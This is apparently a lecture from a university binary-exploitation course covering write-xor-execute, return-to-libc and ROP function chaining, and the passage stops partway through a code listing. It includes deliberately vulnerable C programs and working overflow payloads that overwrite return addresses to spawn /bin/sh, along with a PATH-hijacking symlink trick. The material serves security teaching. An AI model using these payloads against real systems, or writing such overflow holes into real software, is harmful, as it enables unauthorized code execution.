# Unit 7: WxorX and ROP

# Write xor Execute Settings

So far, in all of our exploits on the stack, we've been assuming that
the memory mapped for the stack is set to be executable. That is, we
would overwrite the return address and the have it jump somewhere else
on the stack (say to our shell code) and that code would execute.

This setting is *not* the common setting for modern machines. There is a
principle called "Write xor Execute" or *w* ⊗ *x* which states that a
memory page should either be writable or executable but not both.

What does this mean in practice? Let's take a look at our dummy exploit
code.

``` c
#include <string.h>

int main(int argc, char *argv[]){

  char code[1024];

  strncpy(code,argv[1],1024);

  //cast pointer to function pointer and call
  ((void(*)(void)) code)();

}
```

And we were to compile with our standard options:

``` example
gcc -fno-stack-protector -z execstack -Wno-format-security dummy_exploit.c   -o dummy_exploit
```

You'll notice one option `-z execstack` which says that we are allowed
to have the stack set to executable. Using this program, we can launch a
shell with our standard shell code:

``` example
user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
$ 
```

But, let's run this under gdb first so we can pause the program and see
the memory maps.

``` example
user@si485H-base:demo$ gdb -q dummy_exploit 
Reading symbols from dummy_exploit...done.
(gdb) br main
Breakpoint 1 at 0x8048429: file dummy_exploit.c, line 7.
(gdb) r
Starting program: /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit 

Breakpoint 1, main (argc=1, argv=0xbffff734) at dummy_exploit.c:7
7     strncpy(code,argv[1],1024);
(gdb) info proc
process 1803
cmdline = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
cwd = '/home/user/git/si485-binary-exploits/lec/22/demo'
exe = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
(gdb) shell
user@si485H-base:demo$ cat /proc/1803/map
map_files/ maps       
user@si485H-base:demo$ cat /proc/1803/maps 
08048000-08049000 r-xp 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
08049000-0804a000 r-xp 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
0804a000-0804b000 rwxp 00001000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
b7e19000-b7e1a000 rwxp 00000000 00:00 0 
b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc2000-b7fc4000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc4000-b7fc5000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc5000-b7fc8000 rwxp 00000000 00:00 0 
b7fdb000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7ffe000-b7fff000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7fff000-b8000000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
user@si485H-base:demo$ exit
(gdb) quit
```

If you look closely, you'll see the line for the stack and permissions
`rwxp` which means that this memory region is all read, writable, and
executable. But, we can turn this off with a gcc flag:

``` example
user@si485H-base:demo$ gcc -fno-stack-protector -Wno-format-security dummy_exploit.c   -o dummy_exploit
user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
Segmentation fault (core dumped)
```

Now we do not get a shell, but instead we get a segmentation fault. If
we run this under gdb to look at the maps, the permissions has changed.

``` example
gdb) br main
Breakpoint 1 at 0x8048420
(gdb) r
Starting program: /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit 

Breakpoint 1, 0x08048420 in main ()
(gdb) info proc
process 2043
cmdline = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
cwd = '/home/user/git/si485-binary-exploits/lec/22/demo'
exe = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
(gdb) shell
cuser@si485H-base:demo$ cat /proc/2043/maps
08048000-08049000 r-xp 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
08049000-0804a000 r--p 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
0804a000-0804b000 rw-p 00001000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
b7e19000-b7e1a000 rw-p 00000000 00:00 0 
b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc2000-b7fc4000 r--p 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc4000-b7fc5000 rw-p 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc5000-b7fc8000 rw-p 00000000 00:00 0 
b7fdb000-b7fdd000 rw-p 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7ffe000-b7fff000 r--p 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7fff000-b8000000 rw-p 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
user@si485H-base:demo$ exit
(gdb) quit
```

The challenge now is, how do we still exploit programs that uses
write-xor-execute principles? The answer is, we do not inject our own
shell code anymore, but we rather use the code that already exists and
is already executable to do the job for us.

# Return to Libc

While we might not be able to inject our own shell code into the process
via the stack, we are in a position where we can still use other code to
do our bidding. Namely, we'll focus on the C library function
`system()`.

The `system()` library function takes a string as input and will execute
that string via `execve`. This can be very useful, and very
dangerous.Consider the following program:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char * argv[]){

  system("/bin/sh");

}
```

``` example
user@si485H-base:demo$ ./system_shell 
$ 
```

Essentially, we use the `system()` mini-shell to launch a real `/bin/sh`
shell. That's great, but what does this have to do with exploits? Why
can't we overwrite a return address to jump there?

## Overwriting Return Addresses with `system()`

For this example, we'll work the vulnerable program we've been using so
far in class:

``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void bad(){
  printf("You've been naughty!\n");
}

void good(){
  printf("Go Navy!\n");
}

void vuln(int n, char * str){

  int i = 0;  
  char buf[32];
  strcpy(buf,str);
  while( i < n ){
    printf("%d %s\n",i++, buf);
  }
}

int main(int argc, char *argv[]){
  vuln(atoi(argv[1]), argv[2]);
  return 0;
}
```

Note, that in this example code, we `#include` the `stdlib.h`, which is
the C standard library, and will include all the goodies we need for
this exploit, namely, the `system()` function.

The first thing we need to do is determine *where* the `system()` call
is loaded.

``` example
(gdb) br main
Breakpoint 1 at 0x804852a: file vulnerable.c, line 29.
(gdb) r 
Starting program: /home/user/git/si485-binary-exploits/lec/22/demo/vulnerable 

Breakpoint 1, main (argc=1, argv=0xbffff734) at vulnerable.c:29
29    vuln(atoi(argv[1]), argv[2]);
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e5a190 <__libc_system>
```

So at address 0xb735a190 is the start of the system. Let's try and use
that in our exploit. First, we need to setup the exploit, and we'll do
that in the normal way.

We can find the length of the buffer to the exploit:

``` example
080484d5 <vuln>:
 80484d5:   55                      push   ebp
 80484d6:   89 e5                   mov    ebp,esp
 80484d8:   83 ec 48                sub    esp,0x48
 80484db:   c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0
 80484e2:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484e5:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484e9:   8d 45 d4                lea    eax,[ebp-0x2c] #<------------
 80484ec:   89 04 24                mov    DWORD PTR [esp],eax
 80484ef:   e8 6c fe ff ff          call   8048360 <strcpy@plt>
 80484f4:   eb 20                   jmp    8048516 <vuln+0x41>
 80484f6:   8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80484f9:   8d 50 01                lea    edx,[eax+0x1]
 80484fc:   89 55 f4                mov    DWORD PTR [ebp-0xc],edx
 80484ff:   8d 55 d4                lea    edx,[ebp-0x2c]
 8048502:   89 54 24 08             mov    DWORD PTR [esp+0x8],edx
 8048506:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804850a:   c7 04 24 0e 86 04 08    mov    DWORD PTR [esp],0x804860e
 8048511:   e8 3a fe ff ff          call   8048350 <printf@plt>
 8048516:   8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 8048519:   3b 45 08                cmp    eax,DWORD PTR [ebp+0x8]
 804851c:   7c d8                   jl     80484f6 <vuln+0x21>
 804851e:   c9                      leave  
 804851f:   c3                      ret    
```

Then we can setup the overflow:

``` example
user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\xef\xbe\xad\xde'"`
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[ 2138.032640] vulnerable[2283]: segfault at deadbeef ip deadbeef sp bffff690 error 15
```

## Jumping to system

Once the exploit is setup, now we only need to replace 0xdeadbeef with
0xb7e5a190 to jump the system call:

``` example
user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\x90\xa1\xe5\xb7'"`
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
Segmentation fault (core dumped)
```

That's really interesting because those errors have nothing to do with
the program. Notices that the start of the error message refers to "sh"
reporting the error. Essentially, we were successful in getting
`system()` to execute, but the argument to system was not a valid
command. But, what was it?

Look more closely, you'll see it is a bunch of our A's: it's the input
we provided to the program. So we can control what get's called to it,
and moreover, the system() command accepts valid bash directives. so we
can do the following:

``` example
user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
$
```

And, boom shell! What we did, is we inserted a "/bin/sh;" at the start
of our input string so that it will execute the shell. But there is
still a bunch of A's to follow that will cause an error, and exiting the
program, does just that:

``` example
user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
$ 
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
Segmentation fault (core dumped)
```

## Why this worked so easily

In our example, we got really lucky, because we control the argument to
`/bin/sh`. Let's take a look at the disassemble of `vuln`:

``` example
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
   0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080484e2 <+13>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>:    mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>:    lea    eax,[ebp-0x2c]
   0x080484ec <+23>:    mov    DWORD PTR [esp],eax
   0x080484ef <+26>:    call   0x8048360 <strcpy@plt>
   0x080484f4 <+31>:    jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>:    lea    edx,[eax+0x1]
   0x080484fc <+39>:    mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>:    lea    edx,[ebp-0x2c]
   0x08048502 <+45>:    mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>:    mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>:    mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>:    call   0x8048350 <printf@plt>
   0x08048516 <+65>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>:    cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>:    jl     0x80484f6 <vuln+33>
=> 0x0804851e <+73>:    leave  
   0x0804851f <+74>:    ret    
End of assembler dump.
```

If you look at the stack alignment at this point, we get the following
for the vulnerable function prior to the leave/ret:

``` example
         .---------.
         |  str    | ----> "/bin/sh;AAAAAAAAAAAAAAAAAAA"
         |---------|
         |   n     |
         |---------|
         | ret adr | ----> 0xb7e5a190 (system+0x0)
         |---------|
  ebp -> | sbp     |
         |---------|
         :         :
 esp ->  '---------'    eip: vuln+73
```

After the leave/return we are left with this:

``` example

  ebp -> ???

         .---------.
         |  str    | ----> "/bin/sh;AAAAAAAAAAAAAAAAAAA"
         |---------|
  esp -> |   n     |
         '---------'
                        eip: system+0x0
```

We can further look at the code for system:

``` example
Dump of assembler code for function __libc_system:
   0xb7e5a190 <+0>: push   ebx
   0xb7e5a191 <+1>: sub    esp,0x8                      
   0xb7e5a194 <+4>: mov    eax,DWORD PTR [esp+0x10]
   0xb7e5a198 <+8>: call   0xb7f4094b <__x86.get_pc_thunk.bx>
   0xb7e5a19d <+13>:    add    ebx,0x169e63
   0xb7e5a1a3 <+19>:    test   eax,eax
   0xb7e5a1a5 <+21>:    je     0xb7e5a1b0 <__libc_system+32>
   0xb7e5a1a7 <+23>:    add    esp,0x8
   0xb7e5a1aa <+26>:    pop    ebx
   0xb7e5a1ab <+27>:    jmp    0xb7e59c20 <do_system>   <---------!!!!
   0xb7e5a1b0 <+32>:    lea    eax,[ebx-0x495d4]
   0xb7e5a1b6 <+38>:    call   0xb7e59c20 <do_system>
   0xb7e5a1bb <+43>:    test   eax,eax
   0xb7e5a1bd <+45>:    sete   al
   0xb7e5a1c0 <+48>:    add    esp,0x8
   0xb7e5a1c3 <+51>:    movzx  eax,al
   0xb7e5a1c6 <+54>:    pop    ebx
   0xb7e5a1c7 <+55>:    ret    
```

The `do_system` function is the thing that really does the work for the
system call, and it just so happens that the argument to system when
`do_system()` is called needs to be the **second** value on the stack,
which is exactly what we have! This might not always be the case.

# Harder Return to Lib C

Let's now look at what it takes to do a return to libc attack where we
don't get lucky with the stack alignment. Here's another vulnerable
program:

``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vuln(char * str){
  char buf[32];


  strcpy(buf,str);

  printf("%s\n",buf);
}

int main(int argc, char *argv[]){

  vuln(argv[1]);

  return 0;

}
```

We can do a stack smash alignment like last time:

``` example
0804844d <vuln>:
 804844d:   55                      push   ebp
 804844e:   89 e5                   mov    ebp,esp
 8048450:   83 ec 38                sub    esp,0x38
 8048453:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048456:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804845a:   8d 45 d8                lea    eax,[ebp-0x28] #<---
 804845d:   89 04 24                mov    DWORD PTR [esp],eax
 8048460:   e8 ab fe ff ff          call   8048310 <strcpy@plt>
 8048465:   8d 45 d8                lea    eax,[ebp-0x28]
 8048468:   89 04 24                mov    DWORD PTR [esp],eax
 804846b:   e8 b0 fe ff ff          call   8048320 <puts@plt>
 8048470:   c9                      leave  
 8048471:   c3                      ret    
```

Now when we run our exploit we get:

``` example
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???
sh: 1: 4: not found
Segmentation fault (core dumped)
```

We don't get what we want. But, the game is not up.

## Using Sym Linking and PATH manipulation

If you look closely, you see the error, "4: not found", but let's take a
closer look at this error under `strace`.

``` example
user@si485H-base:demo$ strace -f ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
execve("./harder", ["./harder", "/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAA"...], [/* 20 vars */]) = 0
(...)
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff544) = 2460
waitpid(2460, Process 2460 attached
 <unfinished ...>
(...)
[pid  2460] stat64("/usr/local/sbin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/usr/local/bin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/usr/sbin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/usr/bin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/sbin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/bin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/usr/games/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] stat64("/usr/local/games/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
[pid  2460] write(2, "sh: 1: ", 7sh: 1: )      = 7
[pid  2460] write(2, "4\17\2: not found", 144: not found) = 14
[pid  2460] write(2, "\n", 1
(...)
```

What you see is that it is looking for the string "4\\17\\2" along the
path. All we need to do is create a file along the execution path for
"4\\17\\2" that will execute a shell.

To start, let's create a symbolic link to /bin/sh called "4\\17\\2":

``` example
user@si485H-base:demo$ ln -s /bin/sh $(printf "4\17\2")
user@si485H-base:demo$ ls -l 4^O^B 
lrwxrwxrwx 1 user user 7 Nov 24 10:04 4?? -> /bin/sh
```

Now, we just need to edit the `PATH` environment variable to put this
along the path lookup:

``` example
user@si485H-base:demo$ export PATH=.:$PATH
user@si485H-base:demo$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Now, let's exploit away:

``` example
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???
$ 
```

Boom shell!

## Jumping to the Exploit String

Another option is to write an address to the stack where `system()` will
use it as its argument. Consider that we have control of the stack at
this point, and we can write arbitrarily to the stack, so the question
is, what address do we write? Why not jump to the exploit string itself.

Consider this version of the exploit again this time, I'm going to use
0xdeadbeef for the address of system and then 0xcafebabe for the address
where the address of "/bin/sh" should be.

``` example
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\xef\xbe\xad\xde' + 'BBBB' + '\xbe\xba\xfe\xca'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ?AAAA????
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[ 7089.578719] harder[2566]: segfault at deadbeef ip deadbeef sp bffff690 error 15
```

After the return/leave, the segfault occurs revealing the stack pointer
at the time of the exploit, and this is EXACTLY the information we need
in order to calculate the address of the start of the exploit string
where "/bin/sh;" lives.

Consider again, that after the return and leave, the stack looks like
this:

``` example

  ebp -> ???

         |  ....  |
         |--------|
         |cafebabe|
         |--------|
  esp -> |  BBBB  | ---.
         |--------|    |
         :        :    |
         : ...    :    | 
         : AAAA   :    |  esp - 0x28 - 0x8
         : ;AAA   :    |
         : /cat   :    |
         : /bin   :    |
         ' - -- - '----'
```

Looking at the exploit closely, you see that `esp` references the "BBBB"
following the exploit, we see that this address is exactly 0x28+8 bytes
away from the start of the exploit string. We know this because the
return address was 0x28+4 bytes away, and this is four bytes beyond
that. That means, if we replace 0xcafebabe with
0xbffff690-0x28-8=0xbffff660, we should get the exploit we want. Let's
give it a try:

``` example
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x60\xf6\xff\xbf'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB`???
Segmentation fault (core dumped)
```

That didn't work --- I think that `system()` messed up our string in
some way, but now we are in the range. Let's keep trying addresses up
from there:

``` example
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x60\xf6\xff\xbf'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB`???
Segmentation fault (core dumped)
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x65\xf6\xff\xbf'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBBe???
Segmentation fault (core dumped)
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x6a\xf6\xff\xbf'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBBj???
Segmentation fault (core dumped)
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x70\xf6\xff\xbf'"`
/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBBp???
sh: 1: AAAAAAAAAAAAAAAA: not found
Segmentation fault (core dumped)
```

Now, we've got something cooking. System is trying to execute some input
we provided. Let's just make the rest of the string "/bin/sh;" and maybe
we'll get lucky:

``` example
user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x70\xf6\xff\xbf'"`
/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;AAAA???BBBBp???
$ 
```

So while we didn't get the first one, we eventually found a "/bin/sh".

# Return Oriented Programming: Function Chaining Gadgets

Return Oriented Programming or (ROP) is the process of using small
sequences of code (or gadgets) that are embedded in other code. The
"return" portion of the code comes from the fact that these small pieces
of code, or gadgets, all end with a return statement. The concept is
that while there may be protections in places to stop you from loading
shell code, we can leverage the code already within our target program.

As an additional benefit for ROP, similar to the benefit from
return-2-libc, is that there a ROP chain is functional even when the
stack memory is labeled non-executable and there is memory address
randomization. The reason is that we are only going to use already
existing code to build an exploit, namely code that is in the .text
segment, so it is already labeled executable. Moreover, the .text
segment isn't randomized with ASLR, so it will *always* be consistently
in the same place. This means this style of attack is really powerful
and really consistent.

Below, we follow an example using of ROP where we use it to properly
chain function calls together, but we will also look at an example where
the ROP itself, without calling any other function, is capable of
launching a shell. Also note, that ll the code we are working with in
this lesson are compiled *without* executable stacks, so we can't easily
load shell code [1].

## Overwriting the return address with function calls

Let's start with a simple example of where ROPs become very useful.
Consider the following code where we want bad() to get called

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void bad(){
  printf("You've been PWNED!\n");

}

void vuln(char * s){
  char buf[100];

  strcpy(buf,s);

  printf("Buf: %s\n", buf);
}

void main(int argc, char * argv[]){

    vuln(argv[1]);
}
```

We know how to solve this one: we overflow the buffer and we overwrite
the return the address for vuln() with bad(). To do this, first we can
look at the disassembled code to see where the buffer is declared into
relation to the return address:

``` example
ser@si485H-base:demo$ objdump -d -M intel call_bad
(...)
0804847d <bad>:
 804847d:   55                      push   ebp
 804847e:   89 e5                   mov    ebp,esp
 8048480:   83 ec 18                sub    esp,0x18
 8048483:   c7 04 24 70 85 04 08    mov    DWORD PTR [esp],0x8048570
 804848a:   e8 c1 fe ff ff          call   8048350 <puts@plt>
 804848f:   c9                      leave  
 8048490:   c3      
(...)
08048491 <vuln>:
 8048491:   55                      push   ebp
 8048492:   89 e5                   mov    ebp,esp
 8048494:   81 ec 88 00 00 00       sub    esp,0x88
 804849a:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 804849d:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484a1:   8d 45 94                lea    eax,[ebp-0x6c]
 80484a4:   89 04 24                mov    DWORD PTR [esp],eax
 80484a7:   e8 94 fe ff ff          call   8048340 <strcpy@plt>
 80484ac:   8d 45 94                lea    eax,[ebp-0x6c]
 80484af:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484b3:   c7 04 24 83 85 04 08    mov    DWORD PTR [esp],0x8048583
 80484ba:   e8 71 fe ff ff          call   8048330 <printf@plt>
 80484bf:   c9                      leave  
 80484c0:   c3                      ret    
(...)
```

We see that the buffer is allocated at `ebp-0x6c` so we can quickly do
the exploit like so where we jump to bad():

``` example
user@si485H-base:demo$ ./call_bad `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08'"`
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}?
You've been PWNED!
Segmentation fault (core dumped)
```

## Functions with Arguments

We can make the exploit a little more intriguing if we were to make so
that bad() will call system() with it's argument:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char pwn[]="/bin/sh";

void bad(char * s){
  printf("You've been PWNED!\n");

  system(s);

}

void vuln(char * s){
  char buf[100];

  strcpy(buf,s);

  printf("Buf: %s\n", buf);
}

void main(int argc, char * argv[]){

    vuln(argv[1]);
}
```

In this scenario, much like a return-2-libc attack, if we have the stack
properly aligned with the right argument, namely `pwn`, then we'll get a
shell to launch. For that to happen, we'll need the exploit on the stack
to look like this:

``` example
|     <addr pwn>     |
|  bad's ret address |
|     <addr bad>     |
```

That is, the address of bad overwrites the return address of vuln. The
next item in the stack will be bad's return address, which we don't need
to worry about; however, the following item is the first argument to
bad, which should be pwn.

To complete this exploit, we determine the address of pwn and bad, and
give it a go.

``` example
user@si485H-base:demo$ gdb -q call_bad_sh
Reading symbols from call_bad_sh...done.
(gdb) x/x pwn
0x804a02c <pwn>:    0x6e69622f
(gdb) x/x bad
0x80484ad <bad>:    0x83e58955
(gdb) quit

user@si485H-base:demo$ ./call_bad_sh `python -c "print 'A'*(0x6c+4) + '\xad\x84\x04\x08' + '\xfe\xbe\xad\xde' + '\x2c\xa0\x04\x08'"`
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????,?
You've been PWNED!
$ 
```

That's not too bad.

## Chaining Two Functions with Arguments

Let's add a bit more complexity to this exploit. Suppose now we want to
make a call to another function first before calling bad(), and the
arguments to those functions matter.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char pwn[100];

void bin_sh(int magicbeef){
  if (magicbeef == 0xdeadbeef){
    strcat(pwn,"/bin/sh");
  }
  printf("pwn: %s\n",pwn);

}

void bad(char * s){
  printf("You've been PWNED!\n");

  system(s);

}

void vuln(char * s){
  char buf[100];

  strcpy(buf,s);

  printf("Buf: %s\n", buf);
}

void main(int argc, char * argv[]){
  pwn[0]='\0';
  vuln(argv[1]);
}
```

This time we need to first call bin<sub>sh</sub>() with magicbeef being
deadbeef and then we need to call bad() afterwards to get our shell.
This might seem like no problem, at first, but once we try it out,
you'll see where the challenge arises.

Starting with the easy part, we can look at what the stack should be to
properly call bin<sub>sh</sub>:

``` example
|      0xdeadbeef       |
|  bin_sh's ret address |
|     <addr bin_sh>     |
```

We overwrite the return address of vuln() with the address of
bin<sub>sh</sub>() where it's arguments is 0xdeadbeef. Before, in the
last example, we didn't consider the return address of the function we
jumped to, but this time we have to. What is the next function we call?
bad(). So what we really need for the stack is to look like this.

``` example
|     <addr pwn>        |
|      0xdeadbeef       |
|     <addr bad>        |
|     <addr bin_sh>     |
```

If you follow the stack, the argument to bin<sub>sh</sub>() is
0xdeadbeef and its return address is bad(). The argument to bad() is
`pwn`, and the return address for bad is 0xdeadbeef, which doesn't
matter because at this point we have the shell.

Let's give it a try:

``` example
user@si485H-base:demo$ gdb -q call_bad_chain
Reading symbols from call_bad_chain...done.
(gdb) x/x pwn
0x804a060 <pwn>:    0x00000000
(gdb) x/x bad
0x8048505 <bad>:    0x83e58955
(gdb) x/x bin_sh
0x80484ad <bin_sh>: 0x57e58955
(gdb) quit
user@si485H-base:demo$ ./call_bad_chain `python -c "print 'A'*(0x6c+4) + '\xad\x84\x04\x08' +'\x05\x85\x04\x08' +'\xef\xbe\xad\xde' + '\x60\xa0\x04\x08'"`
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?ﾭ?`?
pwn: /bin/sh
You've been PWNED!
$ 
```

It's a shell! Great.

## Chaining Three or More Functions with Arguments

It's about to fall apart. Consider what happens when we need to call
another function in this chain. Where could it go? Right now we have
this.

``` example
|     <addr pwn>        |
|      0xdeadbeef       | <-- bad's return addres is bin_sh's argument
|     <addr bad>        |
|     <addr bin_sh>     |
```

The slot for bad's return address is already being used for the argument
to bin<sub>sh</sub>. We're hosed. Worse, consider what would happen in
this code example where one of the functions needs to take **two**
arguments:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char pwn[100];

void add_bin(int magiccafe, int magicfood){
  if (magiccafe == 0xcafebabe && magicfood == 0x0badf00d){
    strcat(pwn,"/bin");
  }

  printf("add_bin: pwn: %s\n", pwn);
}


void add_sh(int magicbeef){
  if (magicbeef == 0xdeadbeef){
    strcat(pwn,"/sh");
  }

  printf("add_sh: pwn: %s\n", pwn);
}


void bad(char * s){
  printf("You've been PWNED!\n");

  system(s);

}

void vuln(char * s){
  char buf[100];

  strcpy(buf,s);

  printf("Buf: %s\n", buf);
}

void main(int argc, char * argv[]){
  pwn[0]='\0';
